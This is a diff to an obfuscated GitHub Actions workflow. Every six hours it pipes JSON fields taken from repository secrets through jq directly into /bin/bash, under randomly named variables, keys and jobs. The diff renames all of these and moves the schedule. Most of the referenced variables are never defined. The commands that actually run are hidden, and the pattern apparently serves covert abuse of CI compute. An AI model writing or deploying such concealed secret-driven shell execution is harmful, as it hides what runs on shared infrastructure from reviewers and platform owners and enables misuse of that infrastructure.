@@ -1,25 +1,25 @@
 name: dugoutepee
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 0/6 * * *'
+    - cron: '29 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dugoutepee
         env:
-          nl871: ${{ secrets.nl871 }}
+          c7042: ${{ secrets.c7042 }}
         run: |
-          echo $nl871 | jq -r .xgmy09 | /bin/bash
-          echo $r516 | jq -r .wqzf5217 | /bin/bash
-          echo $v720 | jq -r .qbrtg1880 | /bin/bash
-          echo $qpm75 | jq -r .aa59 | /bin/bash
-          echo $medo4837 | jq -r .gkxrp2 | /bin/bash
-          echo $r74 | jq -r .eo5392 | /bin/bash
-          echo $enrh02 | jq -r .q50894 | /bin/bash
-          echo $i288 | jq -r .giov41 | /bin/bash
-          echo $uz40 | jq -r .gax85 | /bin/bash
-          echo $m6 | jq -r .kcx000 | /bin/bash
+          echo $c7042 | jq -r .yxciz3 | /bin/bash
+          echo $rbxk2 | jq -r .zm822 | /bin/bash
+          echo $zxmo82281 | jq -r .oog8 | /bin/bash
+          echo $twnzq2 | jq -r .bsvkz41 | /bin/bash
+          echo $cz835 | jq -r .ctewc9 | /bin/bash
+          echo $dbznw9 | jq -r .nou41129 | /bin/bash
+          echo $mewc1 | jq -r .pcezp6543 | /bin/bash
 
